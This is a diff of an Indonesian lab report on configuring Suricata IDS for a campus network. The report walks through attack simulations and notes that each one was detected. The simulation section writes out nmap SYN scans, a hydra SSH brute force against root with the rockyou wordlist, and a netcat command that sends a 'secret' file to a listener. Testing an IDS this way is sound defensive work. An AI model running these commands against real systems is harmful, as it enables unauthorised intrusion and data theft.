@@ -33,6 +33,7 @@ Variabel lingkungan didefinisikan untuk membedakan secara jelas antara jaringan 
 | HOME_NET       | 10.20.10.0/24, 10.20.20.0/24, 10.20.30.0/24, 10.20.40.0/24, 10.20.50.0/24                      | 
 | EXTERNAL_NET   | !$HOME_NET (atau any jika diimplementasi sebagai interface WAN)                                | 
 | $DNS\_SERVERS$ | Diset ke IP DNS Internal/Eksternal yang digunakan (misalnya 8.8.8.8, 1.1.1.1 atau IP internal) | 
+
 ### Custome Rules
 a. Rule Port Scanning
 Subnet Mahasiswa = 10.20.10.0/24
@@ -55,35 +56,34 @@ alert http 10.20.30.10 any -> 10.20.10.0/24 any (msg:"[IDS] Suspicious Small HTT
 ```
 
 ### Simulasi Serangan
-a. Simulasi SYN Scan
-Dari PC MAhasiswa
+a. SYN Scan
+Dari PC Mahasiswa
+```
+nmap -sS 10.20.30.0/24
+```
+Suricata mengenali perilaku ini sebagai potensi aktivitas reconnaissance, di mana penyerang mencoba mengidentifikasi port-port terbuka untuk mempersiapkan serangan lanjutan. Keberhasilan Suricata mendeteksi pola SYN scan menunjukkan bahwa IDS mampu memberikan peringatan dini terhadap upaya pemetaan layanan (service enumeration) yang mencurigakan.
 
 b. Network Scanning (Nmap Scan)
 ```
-nmap -sS -p- <IP_TARGET>
+nmap -sS -p- 10.20.30.10
 ```
-
 Suricata berhasil mendeteksi aktivitas scanning dan menghasilkan alert dengan kategori “SCAN”/“PORTSCAN”. Ini menandakan IDS mampu mengidentifikasi upaya pemindaian port yang umum digunakan untuk reconnaissance.
 
 c. SSH Brute Force
 ```
-hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<IP_TARGET>
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.20.30.10
 ```
-
 Suricata berhasil mendeteksi aktivitas brute force terhadap layanan SSH dan menampilkan alert terkait upaya login berulang. Hal ini membuktikan IDS mampu mengidentifikasi perilaku autentikasi yang mencurigakan.
 
 d. Data Exfiltration (Transfer File Besar via Netcat)
-
 Receiver:
 ```
 nc -lvp 4444 > file_terima.txt
 ```
-
 Sender:
 ```
 nc <IP_TARGET> 4444 < file_rahasia.txt
 ```
-
 Suricata menampilkan alert terkait transfer data dalam jumlah besar, menunjukkan bahwa IDS mampu mengidentifikasi pola exfiltration sederhana melalui kanal TCP biasa.
 ### Analisis Singkat
 
